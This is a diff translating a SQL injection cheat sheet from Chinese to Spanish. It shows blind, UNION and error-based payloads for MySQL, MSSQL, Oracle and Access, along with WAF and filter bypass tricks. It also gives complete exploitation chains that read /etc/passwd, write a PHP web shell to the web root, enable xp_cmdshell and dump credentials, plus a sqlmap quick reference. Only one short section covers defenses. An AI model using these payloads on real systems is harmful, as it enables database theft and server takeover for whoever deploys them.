@@ -59,10 +59,10 @@ id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
 id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
 ```
 
-#### 时间盲注
+#### Inyección basada en tiempo (blind)
 
 ```sql
--- MySQL（嵌套延迟实战技巧）
+-- MySQL (técnica práctica de retardo anidado)
 id=(select(2)from(select(sleep(8)))v)
 id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
 -- MSSQL
@@ -71,16 +71,16 @@ id=1; WAITFOR DELAY '0:0:5'--
 id=1 AND dbms_pipe.receive_message('a',5)=1
 ```
 
-#### 联合查询
+#### Consultas UNION
 
 ```sql
-id=1 ORDER BY N--              -- 探列数
-id=-1 UNION SELECT 1,2,3,4,5--  -- 确定回显位
+id=1 ORDER BY N--              -- Sondeo del número de columnas
+id=-1 UNION SELECT 1,2,3,4,5--  -- Determinar la posición reflejada
 id=-1 UNION SELECT 1,database(),version(),user(),5--
 id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
 ```
 
-#### 报错注入
+#### Inyección basada en errores
 
 ```sql
 -- MySQL extractvalue/updatexml
@@ -90,77 +90,77 @@ id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
 id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
 -- MSSQL CONVERT
 id=1 AND 1=CONVERT(INT,(SELECT @@version))
--- CHAR函数绕过字符过滤
+-- Función CHAR para evadir el filtrado de caracteres
 ' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
 ```
 
-### 1.4 WAF/过滤绕过技巧
+### 1.4 Técnicas de bypass de WAF/filtros
 
-#### 内联注释（最常用）
+#### Comentarios en línea (el más usado)
 
 ```sql
 /*!50000union*//*!50000select*/1,2,3
 /*!UNION*//*!SELECT*/1,2,3
--- DeDeCMS绕过实例
+-- Ejemplo de bypass en DeDeCMS
 /*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
 ```
 
-#### 编码绕过
+#### Bypass mediante codificación
 
 ```sql
--- 十六进制: 'admin' -> 0x61646d696e
+-- Hexadecimal: 'admin' -> 0x61646d696e
 SELECT * FROM users WHERE name=0x61646d696e
--- URL双重编码: %252f -> / , %2527 -> '
+-- Doble codificación URL: %252f -> / , %2527 -> '
 -- Unicode: %u0027 -> '
 ```
 
-#### 大小写 + 空白符替换
+#### Sustitución de mayúsculas/minúsculas + espacios en blanco
 
 ```sql
-UnIoN SeLeCt                    -- 大小写混淆
-UNION/**/SELECT/**/1,2,3        -- 注释替代空格
-UNION%09SELECT                  -- Tab替代
-UNION%0ASELECT                  -- 换行替代
+UnIoN SeLeCt                    -- Confusión de mayúsculas/minúsculas
+UNION/**/SELECT/**/1,2,3        -- Comentarios en lugar de espacios
+UNION%09SELECT                  -- Sustitución por tabulación
+UNION%0ASELECT                  -- Sustitución por salto de línea
 ```
 
-#### 函数替代
+#### Sustitución de funciones
 
 ```sql
 SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
 CONCAT -> CONCAT_WS / ||
-CHAR(65) -> 字符A
+CHAR(65) -> carácter A
 ```
 
-#### 逻辑等价替换
+#### Sustitución lógica equivalente
 
 ```sql
 AND 1=1 -> && 1=1 -> & 1
 OR 1=1  -> || 1=1 -> | 1
 id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
--- 引号绕过
+-- Bypass de comillas
 'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
 ```
 
-#### 宽字节注入（GBK编码）
+#### Inyección de byte ancho (codificación GBK)
 
 ```
-%bf%27 绕过 addslashes()   -- GBK下多字节字符吞掉反斜杠
+%bf%27 evade addslashes()   -- En GBK, los caracteres multibyte absorben la barra invertida
 ```
 
-#### HTTP层绕过
+#### Bypass a nivel HTTP
 
 ```
-参数污染: id=1&id=2             -- 重复参数混淆
-分块传输: Transfer-Encoding: chunked
-X-Forwarded-For注入 / Cookie注入  -- 非常规注入点
+Contaminación de parámetros: id=1&id=2             -- Confusión mediante parámetros duplicados
+Transferencia fragmentada: Transfer-Encoding: chunked
+Inyección en X-Forwarded-For / Inyección en Cookie  -- Puntos de inyección no convencionales
 ```
 
-### 1.5 利用链
+### 1.5 Cadenas de explotación
 
-#### MySQL完整利用链
+#### Cadena de explotación completa en MySQL
 
 ```sql
--- 1.信息 -> 2.库 -> 3.表 -> 4.列 -> 5.数据 -> 6.文件 -> 7.Shell
+-- 1.Información -> 2.Base de datos -> 3.Tabla -> 4.Columna -> 5.Datos -> 6.Archivo -> 7.Shell
 union select 1,database(),version(),user(),5--
 union select 1,group_concat(schema_name),3 from information_schema.schemata--
 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
@@ -170,20 +170,20 @@ union select 1,load_file('/etc/passwd'),3--
 union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
 ```
 
-#### MSSQL完整利用链
+#### Cadena de explotación completa en MSSQL
 
 ```sql
 union select 1,@@version,db_name(),system_user,5--
 union select 1,name,3 from master..sysdatabases--
 union select 1,name,3 from sysobjects where xtype='U'--
 union select 1,username+':'+password,3 from users--
--- 命令执行（需sa权限）
+-- Ejecución de comandos (requiere permisos sa)
 EXEC sp_configure 'show advanced options',1;RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
 exec master..xp_cmdshell 'whoami'--
 ```
 
-#### Oracle利用链
+#### Cadena de explotación en Oracle
 
 ```sql
 union select banner,null from v$version where rownum=1--
@@ -191,20 +191,20 @@ union select table_name,null from all_tables where rownum<=10--
 union select username||':'||password,null from users--
 ```
 
-#### Access盲注利用链
+#### Cadena de explotación de inyección ciega en Access
 
 ```sql
--- 无information_schema，需获取源码或猜表名
+-- Sin information_schema, es necesario obtener el código fuente o adivinar los nombres de tabla
 id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
 id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
--- 多用户枚举用NOT IN
+-- Para enumerar múltiples usuarios, usar NOT IN
 id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
 ```
 
-### 1.6 防御措施
+### 1.6 Medidas de defensa
 
 ```python
-# 参数化查询（首选）
+# Consultas parametrizadas (opción preferida)
 cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
 ```
 
@@ -216,28 +216,28 @@ $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
 PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
 ```
 
-- 参数化查询/预编译语句（首选）、存储过程（次选）
-- 白名单输入验证 + 数字型参数强制类型转换
-- 数据库最小权限 + 错误信息隐藏 + WAF部署
+- Consultas parametrizadas/sentencias precompiladas (opción preferida), procedimientos almacenados (opción secundaria)
+- Validación de entrada por lista blanca + conversión forzada de tipo para parámetros numéricos
+- Privilegios mínimos en la base de datos + ocultamiento de mensajes de error + despliegue de WAF
 
 ---
 
 
 ---
 
-## 附录：SQLMap速查
+## Anexo: Referencia rápida de SQLMap
 
 ```bash
-# 基础检测
+# Detección básica
 sqlmap -u "http://t/p.php?id=1" --batch
-# POST请求
+# Petición POST
 sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
-# Cookie/HTTP头注入
+# Inyección vía Cookie/cabecera HTTP
 sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
 sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
-# 绕过WAF
+# Bypass de WAF
 sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
-# 数据提取链
+# Cadena de extracción de datos
 sqlmap ... --dbs
 sqlmap ... -D db --tables
 sqlmap ... -D db -T tbl --columns
